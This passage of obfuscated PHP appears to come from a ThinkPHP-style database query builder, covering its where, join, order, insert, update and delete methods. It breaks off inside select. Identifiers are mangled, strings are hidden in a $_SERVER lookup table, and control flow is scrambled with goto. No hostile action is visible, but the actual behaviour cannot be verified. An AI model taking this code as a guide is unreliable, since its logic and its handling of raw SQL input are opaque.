$B“¹ÜÂ¹…†[800] => isset($d×Ä©à—[$B“¹ÜÂ¹…†[170]]) ? $d×Ä©à—[$B“¹ÜÂ¹…†[170]] : $B“¹ÜÂ¹…†[33], $B“¹ÜÂ¹…†[17] => isset($d×Ä©à—[$B“¹ÜÂ¹…†[75]]) ? substr($d×Ä©à—[$B“¹ÜÂ¹…†[75]], 1) : $B“¹ÜÂ¹…†[33]); } else { preg_match($B“¹ÜÂ¹…†[899], trim($d©ÅÎéïœ±), $D’ç„º†ù­); $AƒÂÑ¶Ô = array($B“¹ÜÂ¹…†[877] => $D’ç„º†ù­[1], $B“¹ÜÂ¹…†[801] => $D’ç„º†ù­[2], $B“¹ÜÂ¹…†[802] => $D’ç„º†ù­[3], $B“¹ÜÂ¹…†[799] => $D’ç„º†ù­[4], $B“¹ÜÂ¹…†[800] => $D’ç„º†ù­[5], $B“¹ÜÂ¹…†[17] => $D’ç„º†ù­[6]); } $AƒÂÑ¶Ô[$B“¹ÜÂ¹…†[828]] = $B“¹ÜÂ¹…†[33]; return $AƒÂÑ¶Ô; } protected function debug() { $A•¹ªÙ¤· =& $_SERVER[‚Ğ°–—î]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $A•¹ªÙ¤·[900]; if (think_config($A•¹ªÙ¤·[901])) { think_status($A•¹ªÙ¤·[902]); think_trace($this->queryStr . $A•¹ªÙ¤·[903] . think_status($A•¹ªÙ¤·[20], $A•¹ªÙ¤·[902], 6) . $A•¹ªÙ¤·[904], $A•¹ªÙ¤·[33], $A•¹ªÙ¤·[905]); } } protected function parseLock($a½´½‘Üğ = false) { $D·‘”†ƒÀÆ =& $_SERVER[‚Ğ°–—î]; if (!$a½´½‘Üğ) { return $D·‘”†ƒÀÆ[33]; } if ($D·‘”†ƒÀÆ[830] == $this->dbType) { return $D·‘”†ƒÀÆ[906]; } return $D·‘”†ƒÀÆ[907]; } protected function parseSet($dÏÌäÍÜ) { $CÍÛ˜ÔŞ©æ =& $_SERVER[‚Ğ°–—î]; foreach ($dÏÌäÍÜ as $F¢÷ÒÇŞ¹ê => $D©ù¥”œªÜ) { if (is_array($D©ù¥”œªÜ) && $CÍÛ˜ÔŞ©æ[285] == $D©ù¥”œªÜ[0]) { $d’§¸Æ¯”[] = $this->parseKey($F¢÷ÒÇŞ¹ê) . $CÍÛ˜ÔŞ©æ[908] . $D©ù¥”œªÜ[1]; } elseif (is_scalar($D©ù¥”œªÜ) || is_null($D©ù¥”œªÜ)) { $d’§¸Æ¯”[] = $this->parseKey($F¢÷ÒÇŞ¹ê) . $CÍÛ˜ÔŞ©æ[908] . $this->parseValue($D©ù¥”œªÜ); } } return $CÍÛ˜ÔŞ©æ[909] . implode($CÍÛ˜ÔŞ©æ[47], $d’§¸Æ¯”); } protected function bindParam($aš¦³™¨ë, $bôØ³–á”) { $this->bind[$_SERVER[‚Ğ°–—î][4] . $aš¦³™¨ë] = $bôØ³–á”; } protected function parseBind($FÄ‰í‰£ßÍ) { $FÄ‰í‰£ßÍ = array_merge($this->bind, $FÄ‰í‰£ßÍ); $this->bind = array(); return $FÄ‰í‰£ßÍ; } function parseKey(&$fäœîƒ´À, $aÊÛÔ§á¢¥ = true) { if ($aÊÛÔ§á¢¥) { $fäœîƒ´À = $this->parseKeyCheck($fäœîƒ´À); } return $fäœîƒ´À; } function parseKeyCheck($dœ™¼Õ›¸’) { $fô¡Öƒ’ =& $_SERVER[‚Ğ°–—î]; $dœ™¼Õ›¸’ = trim($dœ™¼Õ›¸’); if (!preg_match($fô¡Öƒ’[910], $dœ™¼Õ›¸’)) { think_exception($fô¡Öƒ’[911] . $dœ™¼Õ›¸’); } return $dœ™¼Õ›¸’; } protected function parseValue($d‡«ÒÍÙ×ø) { $BŒôóÕìÚ =& $_SERVER[‚Ğ°–—î]; if (is_string($d‡«ÒÍÙ×ø)) { $d‡«ÒÍÙ×ø = $BŒôóÕìÚ[869] . $this->escapeString($d‡«ÒÍÙ×ø) . $BŒôóÕìÚ[869]; } elseif (isset($d‡«ÒÍÙ×ø[0]) && is_string($d‡«ÒÍÙ×ø[0]) && strtolower($d‡«ÒÍÙ×ø[0]) == $BŒôóÕìÚ[285]) { $d‡«ÒÍÙ×ø = $this->escapeString($d‡«ÒÍÙ×ø[1]); } elseif (is_array($d‡«ÒÍÙ×ø)) { $d‡«ÒÍÙ×ø = array_map(array($this, $BŒôóÕìÚ[870]), $d‡«ÒÍÙ×ø); } elseif (is_bool($d‡«ÒÍÙ×ø)) { $d‡«ÒÍÙ×ø = $d‡«ÒÍÙ×ø ? $BŒôóÕìÚ[83] : $BŒôóÕìÚ[468]; } elseif (is_null($d‡«ÒÍÙ×ø)) { $d‡«ÒÍÙ×ø = $BŒôóÕìÚ[99]; } return $d‡«ÒÍÙ×ø; } protected function parseField($b†‹ÌèÅ‡ß) { $aÆù× ¢Û’ =& $_SERVER[‚Ğ°–—î]; if (is_string($b†‹ÌèÅ‡ß) && strpos($b†‹ÌèÅ‡ß, $aÆù× ¢Û’[47])) { $b†‹ÌèÅ‡ß = explode($aÆù× ¢Û’[47], $b†‹ÌèÅ‡ß); } if (is_array($b†‹ÌèÅ‡ß)) { $bå‰ª›š½ = array(); foreach ($b†‹ÌèÅ‡ß as $A‰³ğ’ùÊ => $B‡¾ê–ğ¦±) { if (!is_numeric($A‰³ğ’ùÊ)) { $bå‰ª›š½[] = $this->parseKey($A‰³ğ’ùÊ) . $aÆù× ¢Û’[912] . $this->parseKey($B‡¾ê–ğ¦±); } else { $bå‰ª›š½[] = $this->parseKey($B‡¾ê–ğ¦±); } } $a¶±ƒŞ´Æ = implode($aÆù× ¢Û’[47], $bå‰ª›š½); } elseif (is_string($b†‹ÌèÅ‡ß) && !empty($b†‹ÌèÅ‡ß)) { $a¶±ƒŞ´Æ = $b†‹ÌèÅ‡ß; } else { $a¶±ƒŞ´Æ = $aÆù× ¢Û’[176]; } return $a¶±ƒŞ´Æ; } protected function parseTable($A¡•À†¬ó¥) { $DËŠè±« =& $_SERVER[‚Ğ°–—î]; if (is_array($A¡•À†¬ó¥)) { $fÃ½§ë± = array(); foreach ($A¡•À†¬ó¥ as $CÏ¼œœÛ¿Ò => $fãŸé¢Óòë) { if (!is_numeric($CÏ¼œœÛ¿Ò)) { $fÃ½§ë±[] = $this->parseKey($CÏ¼œœÛ¿Ò) . $DËŠè±«[50] . $this->parseKey($fãŸé¢Óòë); } else { $fÃ½§ë±[] = $this->parseKey($CÏ¼œœÛ¿Ò); } } $A¡•À†¬ó¥ = $fÃ½§ë±; } elseif (is_string($A¡•À†¬ó¥)) { if (strstr($A¡•À†¬ó¥, $DËŠè±«[50])) { return $A¡•À†¬ó¥; } $A¡•À†¬ó¥ = explode($DËŠè±«[47], $A¡•À†¬ó¥); array_walk($A¡•À†¬ó¥, array($this, $DËŠè±«[818])); } return $DËŠè±«[913] . trim(implode($DËŠè±«[914], $A¡•À†¬ó¥), $DËŠè±«[824]) . $DËŠè±«[913]; } protected function parseWhere($c‹ÈÕ©Œ„Õ) { $Dœ£ì“Ş‰É =& $_SERVER[‚Ğ°–—î]; $C–«È ö¤ë = $Dœ£ì“Ş‰É[33]; if (is_string($c‹ÈÕ©Œ„Õ)) { $C–«È ö¤ë = $c‹ÈÕ©Œ„Õ; } else { $cÌÉ°º¿¶… = isset($c‹ÈÕ©Œ„Õ[$Dœ£ì“Ş‰É[915]]) ? strtoupper($c‹ÈÕ©Œ„Õ[$Dœ£ì“Ş‰É[915]]) : $Dœ£ì“Ş‰É[33]; if (in_array($cÌÉ°º¿¶…, array($Dœ£ì“Ş‰É[916], $Dœ£ì“Ş‰É[917], $Dœ£ì“Ş‰É[918]))) { $cÌÉ°º¿¶… = $Dœ£ì“Ş‰É[50] . $cÌÉ°º¿¶… . $Dœ£ì“Ş‰É[50]; unset($c‹ÈÕ©Œ„Õ[$Dœ£ì“Ş‰É[915]]); } else { $cÌÉ°º¿¶… = $Dœ£ì“Ş‰É[919]; } foreach ($c‹ÈÕ©Œ„Õ as $b°¸Ä°š·ä => $AöÅ»¨°ˆ¢) { $C–«È ö¤ë .= $Dœ£ì“Ş‰É[265]; if (is_numeric($b°¸Ä°š·ä)) { $b°¸Ä°š·ä = $Dœ£ì“Ş‰É[920]; } if (0 === strpos($b°¸Ä°š·ä, $Dœ£ì“Ş‰É[70])) { $C–«È ö¤ë .= $this->parseThinkWhere($b°¸Ä°š·ä, $AöÅ»¨°ˆ¢); } else { if (!preg_match($Dœ£ì“Ş‰É[921], trim($b°¸Ä°š·ä))) { think_exception(think_lang($Dœ£ì“Ş‰É[922]) . $Dœ£ì“Ş‰É[4] . $b°¸Ä°š·ä); } $dÕ•‡ÖÃŠ = is_array($AöÅ»¨°ˆ¢) && isset($AöÅ»¨°ˆ¢[$Dœ£ì“Ş‰É[923]]); $b°¸Ä°š·ä = trim($b°¸Ä°š·ä); if (strpos($b°¸Ä°š·ä, $Dœ£ì“Ş‰É[271])) { $E½¨Äœˆ’Ê = explode($Dœ£ì“Ş‰É[271], $b°¸Ä°š·ä); $a¹Œœ¼ ‡ = array(); foreach ($E½¨Äœˆ’Ê as $FË·ì‡¯èß => $Fï¥Š²ÌÇÄ) { $c¥ÀíÀªá‚ = $dÕ•‡ÖÃŠ ? $AöÅ»¨°ˆ¢[$FË·ì‡¯èß] : $AöÅ»¨°ˆ¢; $a¹Œœ¼ ‡[] = $Dœ£ì“Ş‰É[248] . $this->parseWhereItem($this->parseKey($Fï¥Š²ÌÇÄ), $c¥ÀíÀªá‚) . $Dœ£ì“Ş‰É[817]; } $C–«È ö¤ë .= implode($Dœ£ì“Ş‰É[924], $a¹Œœ¼ ‡); } elseif (strpos($b°¸Ä°š·ä, $Dœ£ì“Ş‰É[272])) { $E½¨Äœˆ’Ê = explode($Dœ£ì“Ş‰É[272], $b°¸Ä°š·ä); $a¹Œœ¼ ‡ = array(); foreach ($E½¨Äœˆ’Ê as $FË·ì‡¯èß => $Fï¥Š²ÌÇÄ) { $c¥ÀíÀªá‚ = $dÕ•‡ÖÃŠ ? $AöÅ»¨°ˆ¢[$FË·ì‡¯èß] : $AöÅ»¨°ˆ¢; $a¹Œœ¼ ‡[] = $Dœ£ì“Ş‰É[248] . $this->parseWhereItem($this->parseKey($Fï¥Š²ÌÇÄ), $c¥ÀíÀªá‚) . $Dœ£ì“Ş‰É[817]; } $C–«È ö¤ë .= implode($Dœ£ì“Ş‰É[919], $a¹Œœ¼ ‡); } else { $C–«È ö¤ë .= $this->parseWhereItem($this->parseKey($b°¸Ä°š·ä), $AöÅ»¨°ˆ¢); } } $C–«È ö¤ë .= $Dœ£ì“Ş‰É[266] . $cÌÉ°º¿¶…; } $C–«È ö¤ë = substr($C–«È ö¤ë, 0, -strlen($cÌÉ°º¿¶…)); } return empty($C–«È ö¤ë) ? $Dœ£ì“Ş‰É[33] : $Dœ£ì“Ş‰É[925] . $C–«È ö¤ë; } protected function parseWhereItem($A«™–‚Ö ä, $b°±•ª‚) { $AÊÖóø‚Ú =& $_SERVER[‚Ğ°–—î]; $A‹Œ¸ÓùÈ = $AÊÖóø‚Ú[33]; if (is_array($b°±•ª‚)) { if (is_string($b°±•ª‚[0])) { $bäÒÜ×Ú‘ = strtolower($b°±•ª‚[0]); if (in_array($b°±•ª‚[0], array($AÊÖóø‚Ú[908], $AÊÖóø‚Ú[926], $AÊÖóø‚Ú[927], $AÊÖóø‚Ú[928], $AÊÖóø‚Ú[929], $AÊÖóø‚Ú[930]))) { $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $b°±•ª‚[0] . $AÊÖóø‚Ú[50] . $this->parseValue($b°±•ª‚[1]); } elseif (preg_match($AÊÖóø‚Ú[931], $b°±•ª‚[0])) { $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[50] . $this->parseValue($b°±•ª‚[1]); } elseif (preg_match($AÊÖóø‚Ú[932], $b°±•ª‚[0])) { if (is_array($b°±•ª‚[1])) { $F‘Àóß« = isset($b°±•ª‚[2]) ? strtoupper($b°±•ª‚[2]) : $AÊÖóø‚Ú[917]; if (in_array($F‘Àóß«, array($AÊÖóø‚Ú[916], $AÊÖóø‚Ú[917], $AÊÖóø‚Ú[918]))) { $F¤¯Äª¨Á˜ = array(); foreach ($b°±•ª‚[1] as $BÍ‚ªµ©Ä¶) { $F¤¯Äª¨Á˜[] = $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[50] . $this->parseValue($BÍ‚ªµ©Ä¶); } $A‹Œ¸ÓùÈ .= $AÊÖóø‚Ú[248] . implode($AÊÖóø‚Ú[50] . $F‘Àóß« . $AÊÖóø‚Ú[50], $F¤¯Äª¨Á˜) . $AÊÖóø‚Ú[817]; } } else { $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[50] . $this->parseValue($b°±•ª‚[1]); } } elseif ($AÊÖóø‚Ú[285] == $bäÒÜ×Ú‘) { $A‹Œ¸ÓùÈ .= $AÊÖóø‚Ú[815] . $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $b°±•ª‚[1] . $AÊÖóø‚Ú[933]; } elseif (preg_match($AÊÖóø‚Ú[934], $b°±•ª‚[0])) { if (isset($b°±•ª‚[2]) && $AÊÖóø‚Ú[285] == $b°±•ª‚[2]) { $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[50] . $b°±•ª‚[1]; } else { if (is_string($b°±•ª‚[1])) { $b°±•ª‚[1] = explode($AÊÖóø‚Ú[47], $b°±•ª‚[1]); } $BÜøƒï™à— = implode($AÊÖóø‚Ú[47], $this->parseValue($b°±•ª‚[1])); $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[815] . $BÜøƒï™à— . $AÊÖóø‚Ú[817]; } } elseif (preg_match($AÊÖóø‚Ú[935], $b°±•ª‚[0])) { $bÉ‚İ¢†·° = is_string($b°±•ª‚[1]) ? explode($AÊÖóø‚Ú[47], $b°±•ª‚[1]) : $b°±•ª‚[1]; $A‹Œ¸ÓùÈ .= $AÊÖóø‚Ú[815] . $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $this->exp[$bäÒÜ×Ú‘] . $AÊÖóø‚Ú[50] . $this->parseValue($bÉ‚İ¢†·°[0]) . $AÊÖóø‚Ú[919] . $this->parseValue($bÉ‚İ¢†·°[1]) . $AÊÖóø‚Ú[266]; } else { think_exception(think_lang($AÊÖóø‚Ú[922]) . $AÊÖóø‚Ú[4] . $b°±•ª‚[0]); } } else { $F†İËÀ“² = count($b°±•ª‚); $c÷æ¥æ¾Í· = isset($b°±•ª‚[$F†İËÀ“² - 1]) ? strtoupper($b°±•ª‚[$F†İËÀ“² - 1]) : $AÊÖóø‚Ú[33]; if (in_array($c÷æ¥æ¾Í·, array($AÊÖóø‚Ú[916], $AÊÖóø‚Ú[917], $AÊÖóø‚Ú[918]))) { $F†İËÀ“² = $F†İËÀ“² - 1; } else { $c÷æ¥æ¾Í· = $AÊÖóø‚Ú[916]; } for ($a¶Ì‰²©Ì = 0; $a¶Ì‰²©Ì < $F†İËÀ“²; $a¶Ì‰²©Ì++) { $bÉ‚İ¢†·° = is_array($b°±•ª‚[$a¶Ì‰²©Ì]) ? $b°±•ª‚[$a¶Ì‰²©Ì][1] : $b°±•ª‚[$a¶Ì‰²©Ì]; if ($AÊÖóø‚Ú[285] == strtolower($b°±•ª‚[$a¶Ì‰²©Ì][0])) { $A‹Œ¸ÓùÈ .= $AÊÖóø‚Ú[248] . $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $bÉ‚İ¢†·° . $AÊÖóø‚Ú[933] . $c÷æ¥æ¾Í· . $AÊÖóø‚Ú[50]; } else { $dßô¬§õÏ = is_array($b°±•ª‚[$a¶Ì‰²©Ì]) ? $this->exp[strtolower($b°±•ª‚[$a¶Ì‰²©Ì][0])] : $AÊÖóø‚Ú[908]; if (!$dßô¬§õÏ && is_array($b°±•ª‚[$a¶Ì‰²©Ì]) && in_array($b°±•ª‚[$a¶Ì‰²©Ì][0], array($AÊÖóø‚Ú[908], $AÊÖóø‚Ú[926], $AÊÖóø‚Ú[927], $AÊÖóø‚Ú[928], $AÊÖóø‚Ú[929], $AÊÖóø‚Ú[930]))) { $dßô¬§õÏ = $b°±•ª‚[$a¶Ì‰²©Ì][0]; } $A‹Œ¸ÓùÈ .= $AÊÖóø‚Ú[248] . $A«™–‚Ö ä . $AÊÖóø‚Ú[50] . $dßô¬§õÏ . $AÊÖóø‚Ú[50] . $this->parseValue($bÉ‚İ¢†·°) . $AÊÖóø‚Ú[933] . $c÷æ¥æ¾Í· . $AÊÖóø‚Ú[50]; } } $A‹Œ¸ÓùÈ = substr($A‹Œ¸ÓùÈ, 0, -4); } } else { $A‹Œ¸ÓùÈ .= $A«™–‚Ö ä . $AÊÖóø‚Ú[936] . $this->parseValue($b°±•ª‚); } return $A‹Œ¸ÓùÈ; } protected function parseThinkWhere($f›¨­ªšÀ, $D Õ“Õ†óÒ) { $c¼¯Ìø›‚ =& $_SERVER[‚Ğ°–—î]; $a©ƒ³Á±ƒ = $c¼¯Ìø›‚[33]; switch ($f›¨­ªšÀ) { case $c¼¯Ìø›‚[339]: $a©ƒ³Á±ƒ = $D Õ“Õ†óÒ; break; case $c¼¯Ìø›‚[920]: $a©ƒ³Á±ƒ = is_string($D Õ“Õ†óÒ) ? $D Õ“Õ†óÒ : substr($this->parseWhere($D Õ“Õ†óÒ), 6); break; case $c¼¯Ìø›‚[937]: parse_str($D Õ“Õ†óÒ, $AÇ•Ô£ÊŸ•); if (isset($AÇ•Ô£ÊŸ•[$c¼¯Ìø›‚[915]])) { $cÉ”ğ‘„š’ = $c¼¯Ìø›‚[50] . strtoupper($AÇ•Ô£ÊŸ•[$c¼¯Ìø›‚[915]]) . $c¼¯Ìø›‚[50]; unset($AÇ•Ô£ÊŸ•[$c¼¯Ìø›‚[915]]); } else { $cÉ”ğ‘„š’ = $c¼¯Ìø›‚[919]; } $b‰Ã¹ÜÖõİ = array(); foreach ($AÇ•Ô£ÊŸ• as $dòÛ®“†× => $C‚ñØÀÍƒˆ) { $b‰Ã¹ÜÖõİ[] = $this->parseKey($dòÛ®“†×) . $c¼¯Ìø›‚[936] . $this->parseValue($C‚ñØÀÍƒˆ); } $a©ƒ³Á±ƒ = implode($cÉ”ğ‘„š’, $b‰Ã¹ÜÖõİ); break; } return $a©ƒ³Á±ƒ; } protected function parseLimit($DËİ²¥Â‹°) { $a¡çÉäİŞé =& $_SERVER[‚Ğ°–—î]; return !empty($DËİ²¥Â‹°) ? $a¡çÉäİŞé[48] . $DËİ²¥Â‹° . $a¡çÉäİŞé[50] : $a¡çÉäİŞé[33]; } protected function parseJoin($cÍêÂçŸ°í) { $eÚÅ˜†²ˆ =& $_SERVER[‚Ğ°–—î]; $açÂ‡Ãæ¥¦ = $eÚÅ˜†²ˆ[33]; if (!empty($cÍêÂçŸ°í)) { if (is_array($cÍêÂçŸ°í)) { foreach ($cÍêÂçŸ°í as $D‘Ëšñåƒ => $Eù»—­Š›‡) { if (!1 !== stripos($Eù»—­Š›‡, $eÚÅ˜†²ˆ[938])) { $açÂ‡Ãæ¥¦ .= $eÚÅ˜†²ˆ[50] . $Eù»—­Š›‡; } else { $açÂ‡Ãæ¥¦ .= $eÚÅ˜†²ˆ[939] . $Eù»—­Š›‡; } } } else { $açÂ‡Ãæ¥¦ .= $eÚÅ˜†²ˆ[939] . $cÍêÂçŸ°í; } } $açÂ‡Ãæ¥¦ = preg_replace($eÚÅ˜†²ˆ[940], think_config($eÚÅ˜†²ˆ[842]) . $eÚÅ˜†²ˆ[941], $açÂ‡Ãæ¥¦); return $açÂ‡Ãæ¥¦; } protected function parseOrder($FİÒñºİ›) { $EÎÉÀ”Áİ =& $_SERVER[‚Ğ°–—î]; if (is_array($FİÒñºİ›)) { $bÑÙêÔô–ä = array(); foreach ($FİÒñºİ› as $BÄà”öêÉ => $eÎ³½µ¸Ş) { if (is_numeric($BÄà”öêÉ)) { $bÑÙêÔô–ä[] = $this->parseKey($eÎ³½µ¸Ş); } else { $eÎ³½µ¸Ş = in_array(strtoupper(trim($eÎ³½µ¸Ş)), array($EÎÉÀ”Áİ[942], $EÎÉÀ”Áİ[943])) ? $EÎÉÀ”Áİ[50] . $eÎ³½µ¸Ş : $EÎÉÀ”Áİ[33]; if (preg_match($EÎÉÀ”Áİ[944], $BÄà”öêÉ)) { $bÑÙêÔô–ä[] = $this->parseKey($BÄà”öêÉ) . $eÎ³½µ¸Ş; } else { think_exception($EÎÉÀ”Áİ[945] . $BÄà”öêÉ); } } } $FİÒñºİ› = implode($EÎÉÀ”Áİ[47], $bÑÙêÔô–ä); } return !empty($FİÒñºİ›) ? $EÎÉÀ”Áİ[946] . $FİÒñºİ› : $EÎÉÀ”Áİ[33]; } protected function parseGroup($eè©ÀÜ‚š) { $BÏñ¬»ÄÏï =& $_SERVER[‚Ğ°–—î]; return !empty($eè©ÀÜ‚š) ? $BÏñ¬»ÄÏï[947] . $eè©ÀÜ‚š : $BÏñ¬»ÄÏï[33]; } protected function parseHaving($F†˜½‡½‘„) { $d‘›í™Á¼½ =& $_SERVER[‚Ğ°–—î]; return !empty($F†˜½‡½‘„) ? $d‘›í™Á¼½[948] . $F†˜½‡½‘„ : $d‘›í™Á¼½[33]; } protected function parseComment($eÎºäÖÇ) { $cÑñ‰§×Ä¬ =& $_SERVER[‚Ğ°–—î]; return !empty($eÎºäÖÇ) ? $cÑñ‰§×Ä¬[949] . $eÎºäÖÇ . $cÑñ‰§×Ä¬[950] : $cÑñ‰§×Ä¬[33]; } protected function parseDistinct($aØ¸„ ¤»‡) { $F§îöÇŠêÁ =& $_SERVER[‚Ğ°–—î]; return !empty($aØ¸„ ¤»‡) ? $F§îöÇŠêÁ[951] : $F§îöÇŠêÁ[33]; } protected function parseUnion($a•‰‘ñŞá³) { $F‘—²¾„Ä =& $_SERVER[‚Ğ°–—î]; if (empty($a•‰‘ñŞá³)) { return $F‘—²¾„Ä[33]; } if (isset($a•‰‘ñŞá³[$F‘—²¾„Ä[336]])) { $cÔ¦ ©¬ = $F‘—²¾„Ä[952]; unset($a•‰‘ñŞá³[$F‘—²¾„Ä[336]]); } else { $cÔ¦ ©¬ = $F‘—²¾„Ä[953]; } foreach ($a•‰‘ñŞá³ as $Cº²ŠÄ–‰Œ) { $C½‚çÇ§¶ï[] = $cÔ¦ ©¬ . (is_array($Cº²ŠÄ–‰Œ) ? $this->buildSelectSql($Cº²ŠÄ–‰Œ) : $Cº²ŠÄ–‰Œ); } return implode($F‘—²¾„Ä[50], $C½‚çÇ§¶ï); } public function insert($cÈ©ÂÊ¹ÇÛ, $D¬Á™ö‡µ³ = array(), $cñŸÎ‹Ê´ = false) { goto E¥‚ÙŞ»Àó; bªç–­¤ Ü: foreach ($cÈ©ÂÊ¹ÇÛ as $e†Ş×‰÷’Ù => $aè—»­˜ƒ) { if (is_array($aè—»­˜ƒ) && $DÙ±ï›–¸æ[285] == $aè—»­˜ƒ[0]) { $EÛƒ‘‰¢´[] = $this->parseKey($e†Ş×‰÷’Ù); $d½ºÖ—õ“°[] = $aè—»­˜ƒ[1]; } elseif (is_scalar($aè—»­˜ƒ) || is_null($aè—»­˜ƒ)) { $EÛƒ‘‰¢´[] = $this->parseKey($e†Ş×‰÷’Ù); $d½ºÖ—õ“°[] = $this->parseValue($aè—»­˜ƒ); } } $AÖ•÷Ì¶— = ($cñŸÎ‹Ê´ ? $DÙ±ï›–¸æ[819] : $DÙ±ï›–¸æ[820]) . $DÙ±ï›–¸æ[821] . $this->parseTable($D¬Á™ö‡µ³[$DÙ±ï›–¸æ[267]]) . $DÙ±ï›–¸æ[815] . implode($DÙ±ï›–¸æ[47], $EÛƒ‘‰¢´) . $DÙ±ï›–¸æ[816] . implode($DÙ±ï›–¸æ[47], $d½ºÖ—õ“°) . $DÙ±ï›–¸æ[817]; $AÖ•÷Ì¶— .= $this->parseLock(isset($D¬Á™ö‡µ³[$DÙ±ï›–¸æ[771]]) ? $D¬Á™ö‡µ³[$DÙ±ï›–¸æ[771]] : !1); goto CÃ…ÈÇÏï¯; E¥‚ÙŞ»Àó: $DÙ±ï›–¸æ =& $_SERVER[‚Ğ°–—î]; $d½ºÖ—õ“° = $EÛƒ‘‰¢´ = array(); $this->model = $D¬Á™ö‡µ³[$DÙ±ï›–¸æ[269]]; goto bªç–­¤ Ü; CÃ…ÈÇÏï¯: $AÖ•÷Ì¶— .= $this->parseComment(!empty($D¬Á™ö‡µ³[$DÙ±ï›–¸æ[341]]) ? $D¬Á™ö‡µ³[$DÙ±ï›–¸æ[341]] : $DÙ±ï›–¸æ[33]); return $this->execute($AÖ•÷Ì¶—, $this->parseBind(!empty($D¬Á™ö‡µ³[$DÙ±ï›–¸æ[273]]) ? $D¬Á™ö‡µ³[$DÙ±ï›–¸æ[273]] : array())); goto e¨°¿’¹”ã; e¨°¿’¹”ã: } public function selectInsert($Bµ‹°Í‡áÃ, $c’ÔÜ…Äœ, $fÃçƒñÅ‡ = array()) { goto cçİ½Ù²ºÄ; dĞ¶ÆñäÓç: return $this->execute($fÇõÛÓÍ¤Ú, $this->parseBind(!empty($fÃçƒñÅ‡[$B‚ÑÆ¾‘„[273]]) ? $fÃçƒñÅ‡[$B‚ÑÆ¾‘„[273]] : array())); goto DÛ†¡¤Èƒâ; cçİ½Ù²ºÄ: $B‚ÑÆ¾‘„ =& $_SERVER[‚Ğ°–—î]; $this->model = $fÃçƒñÅ‡[$B‚ÑÆ¾‘„[269]]; if (is_string($Bµ‹°Í‡áÃ)) { $Bµ‹°Í‡áÃ = explode($B‚ÑÆ¾‘„[47], $Bµ‹°Í‡áÃ); } goto aÌ˜²ŸùŒ; aÌ˜²ŸùŒ: array_walk($Bµ‹°Í‡áÃ, array($this, $B‚ÑÆ¾‘„[818])); $fÇõÛÓÍ¤Ú = $B‚ÑÆ¾‘„[954] . $this->parseTable($c’ÔÜ…Äœ) . $B‚ÑÆ¾‘„[815] . implode($B‚ÑÆ¾‘„[47], $Bµ‹°Í‡áÃ) . $B‚ÑÆ¾‘„[933]; $fÇõÛÓÍ¤Ú .= $this->buildSelectSql($fÃçƒñÅ‡); goto dĞ¶ÆñäÓç; DÛ†¡¤Èƒâ: } public function update($f Ëà™, $dÌ‹‹à”) { $bƒŠõ‚”‘™ =& $_SERVER[‚Ğ°–—î]; $this->model = $dÌ‹‹à”[$bƒŠõ‚”‘™[269]]; $eÅ’×¶ìÖ¼ = $bƒŠõ‚”‘™[955] . $this->parseTable($dÌ‹‹à”[$bƒŠõ‚”‘™[267]]) . $this->parseSet($f Ëà™) . $this->parseWhere(!empty($dÌ‹‹à”[$bƒŠõ‚”‘™[263]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[263]] : $bƒŠõ‚”‘™[33]) . $this->parseOrder(!empty($dÌ‹‹à”[$bƒŠõ‚”‘™[350]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[350]] : $bƒŠõ‚”‘™[33]) . $this->parseLimit(!empty($dÌ‹‹à”[$bƒŠõ‚”‘™[280]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[280]] : $bƒŠõ‚”‘™[33]) . $this->parseLock(isset($dÌ‹‹à”[$bƒŠõ‚”‘™[771]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[771]] : !1) . $this->parseComment(!empty($dÌ‹‹à”[$bƒŠõ‚”‘™[341]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[341]] : $bƒŠõ‚”‘™[33]); return $this->execute($eÅ’×¶ìÖ¼, $this->parseBind(!empty($dÌ‹‹à”[$bƒŠõ‚”‘™[273]]) ? $dÌ‹‹à”[$bƒŠõ‚”‘™[273]] : array())); } public function delete($Fï‡²ºïˆæ = array()) { $eé…ãó™Ñ =& $_SERVER[‚Ğ°–—î]; $this->model = $Fï‡²ºïˆæ[$eé…ãó™Ñ[269]]; $bñ§ï¢ ¸ç = $eé…ãó™Ñ[956] . $this->parseTable($Fï‡²ºïˆæ[$eé…ãó™Ñ[267]]) . $this->parseWhere(!empty($Fï‡²ºïˆæ[$eé…ãó™Ñ[263]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[263]] : $eé…ãó™Ñ[33]) . $this->parseOrder(!empty($Fï‡²ºïˆæ[$eé…ãó™Ñ[350]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[350]] : $eé…ãó™Ñ[33]) . $this->parseLimit(!empty($Fï‡²ºïˆæ[$eé…ãó™Ñ[280]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[280]] : $eé…ãó™Ñ[33]) . $this->parseLock(isset($Fï‡²ºïˆæ[$eé…ãó™Ñ[771]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[771]] : !1) . $this->parseComment(!empty($Fï‡²ºïˆæ[$eé…ãó™Ñ[341]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[341]] : $eé…ãó™Ñ[33]); return $this->execute($bñ§ï¢ ¸ç, $this->parseBind(!empty($Fï‡²ºïˆæ[$eé…ãó™Ñ[273]]) ? $Fï‡²ºïˆæ[$eé…ãó™Ñ[273]] : array())); } public function select($b¹Ü·—£ğ = array()) { goto 